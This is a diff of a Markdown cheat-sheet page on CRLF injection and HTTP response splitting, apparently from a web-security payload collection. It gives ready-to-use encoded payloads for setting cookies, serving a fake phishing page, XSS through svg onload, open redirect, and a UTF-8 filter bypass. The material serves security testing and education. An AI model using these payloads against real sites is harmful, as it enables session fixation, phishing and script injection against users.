@@ -1,56 +1,89 @@
 # Carriage Return Line Feed
 
-> The term CRLF refers to Carriage Return (ASCII 13, \r) Line Feed (ASCII 10, \n). They're used to note the termination of a line, however, dealt with differently in today’s popular Operating Systems. For example: in Windows both a CR and LF are required to note the end of a line, whereas in Linux/UNIX a LF is only required. In the HTTP protocol, the CR-LF sequence is always used to terminate a line.
-
-> A CRLF Injection attack occurs when a user manages to submit a CRLF into an application. This is most commonly done by modifying an HTTP parameter or URL.
-
+> CRLF Injection is a web security vulnerability that arises when an attacker injects unexpected Carriage Return (CR) (\r) and Line Feed (LF) (\n) characters into an application. These characters are used to signify the end of a line and the start of a new one in network protocols like HTTP, SMTP, and others. In the HTTP protocol, the CR-LF sequence is always used to terminate a line.
 
 ## Summary
 
 * [Methodology](#methodology)
-    * [Add a cookie](#add-a-cookie)
-    * [Add a cookie - XSS Bypass](#add-a-cookie---xss-bypass)
-    * [Write HTML](#write-html)
-    * [Filter Bypass](#filter-bypass)
+    * [Session Fixation](#session-fixation)
+    * [Cross Site Scripting](#cross-site-scripting)
+    * [Open Redirect](#open-redirect)
+* [Filter Bypass](#filter-bypass)
 * [Labs](#labs)
 * [References](#references)
 
 
 ## Methodology
 
-### Add a cookie
+HTTP Response Splitting is a security vulnerability where an attacker manipulates an HTTP response by injecting Carriage Return (CR) and Line Feed (LF) characters (collectively called CRLF) into a response header. These characters mark the end of a header and the start of a new line in HTTP responses.
 
-Requested page
+**CRLF Characters**:
+
+* `CR` (`\r`, ASCII 13): Moves the cursor to the beginning of the line.
+* `LF` (`\n`, ASCII 10): Moves the cursor to the next line.
+
+By injecting a CRLF sequence, the attacker can break the response into two parts, effectively controlling the structure of the HTTP response. This can result in various security issues, such as:
+
+* Cross-Site Scripting (XSS): Injecting malicious scripts into the second response.
+* Cache Poisoning: Forcing incorrect content to be stored in caches.
+* Header Manipulation: Altering headers to mislead users or systems
+
+
+### Session Fixation
+
+A typical HTTP response header looks like this:
 
 ```http
-http://www.example.net/%0D%0ASet-Cookie:mycookie=myvalue
-```
-
-HTTP Response
-
-```http
-Connection: keep-alive
-Content-Length: 178
+HTTP/1.1 200 OK
 Content-Type: text/html
-Date: Mon, 09 May 2016 14:47:29 GMT
-Location: https://www.example.net/[INJECTION STARTS HERE]
-Set-Cookie: mycookie=myvalue
-X-Frame-Options: SAMEORIGIN
-X-Sucuri-ID: 15016
-x-content-type-options: nosniff
-x-xss-protection: 1; mode=block
+Set-Cookie: sessionid=abc123
 ```
 
+If user input `value\r\nSet-Cookie: admin=true` is embedded into the headers without sanitization:
 
-### Add a cookie - XSS Bypass
+```http
+HTTP/1.1 200 OK
+Content-Type: text/html
+Set-Cookie: sessionid=value
+Set-Cookie: admin=true
+```
 
-Requested page
+Now the attacker has set their own cookie.
+
+
+### Cross Site Scripting
+
+Beside the session fixation that requires a very insecure way of handling user session, the easiest way to exploit a CRLF injection is to write a new body for the page. It can be used to create a phishing page or to trigger an arbitrary Javascript code (XSS).
+
+**Requested page**
+
+```http
+http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
+```
+
+**HTTP response**
+
+```http
+Set-Cookie:en
+Content-Length: 0
+
+HTTP/1.1 200 OK
+Content-Type: text/html
+Last-Modified: Mon, 27 Oct 2060 14:50:18 GMT
+Content-Length: 34
+
+<html>You have been Phished</html>
+```
+
+In the case of an XSS, the CRLF injection allows to inject the `X-XSS-Protection` header with the value value "0", to disable it. And then we can add our HTML tag containing Javascript code .
+
+**Requested page**
 
 ```powershell
 http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
 ```
 
-HTTP Response
+**HTTP Response**
 
 ```http
 HTTP/1.1 200 OK
@@ -73,44 +106,38 @@ X-XSS-Protection:0
 0
 ```
 
+### Open Redirect
 
-### Write HTML
+Inject a `Location` header to force a redirect for the user.
 
-Requested page
-
-```http
-http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
-```
-
-HTTP response
-
-```http
-Set-Cookie:en
-Content-Length: 0
-
-HTTP/1.1 200 OK
-Content-Type: text/html
-Last-Modified: Mon, 27 Oct 2060 14:50:18 GMT
-Content-Length: 34
-
-<html>You have been Phished</html>
+```ps1
+%0d%0aLocation:%20http://myweb.com
 ```
 
 
-### Filter Bypass
+## Filter Bypass
 
-Using UTF-8 encoding
+[RFC 7230](https://datatracker.ietf.org/doc/html/rfc7230#section-3.2.4) states that most HTTP header field values use only a subset of the US-ASCII charset. 
+
+> Newly defined header fields SHOULD limit their field values to US-ASCII octets.
+
+Firefox followed the spec by stripping off any out-of-range characters when setting cookies instead of encoding them.
+
+| UTF-8 Character | Hex | Unicode | Stripped |
+| --------- | --- | ------- | -------- |
+| `嘊` | `%E5%98%8A` | `\u560a` | `%0A` (\n) |
+| `嘍` | `%E5%98%8D` | `\u560d` | `%0D` (\r) |
+| `嘾` | `%E5%98%BE` | `\u563e` | `%3E` (>)  |
+| `嘼` | `%E5%98%BC` | `\u563c` | `%3C` (<)  |
+
+The UTF-8 character `嘊` contains `0a` in the last part of its hex format, which would be converted as `\n` by Firefox.
+
+
+Using UTF-8 encoding: `嘊嘍content-type:text/html嘊嘍location:嘊嘍嘊嘍嘼svg/onload=alert(document.domain()嘾`
 
 ```http
-%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE
+%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28document.domain%28%29%E5%98%BE
 ```
-
-Remainder:
-
-* `%E5%98%8A` = `%0A` = \u560a
-* `%E5%98%8D` = `%0D` = \u560d
-* `%E5%98%BE` = `%3E` = \u563e (>)
-* `%E5%98%BC` = `%3C` = \u563c (<)
 
 
 ## Labs
@@ -122,4 +149,5 @@ Remainder:
 ## References
 
 - [CRLF Injection - CWE-93 - OWASP - May 20, 2022](https://www.owasp.org/index.php/CRLF_Injection)
-- [Starbucks: [newscdn.starbucks.com] CRLF Injection, XSS - Bobrov - 2016-12-20](https://vulners.com/hackerone/H1:192749)
+- [CRLF injection on Twitter or why blacklists fail - XSS Jigsaw - April 21, 2015](https://web.archive.org/web/20150425024348/https://blog.innerht.ml/twitter-crlf-injection/)
+- [Starbucks: [newscdn.starbucks.com] CRLF Injection, XSS - Bobrov - December 20, 2016](https://vulners.com/hackerone/H1:192749)
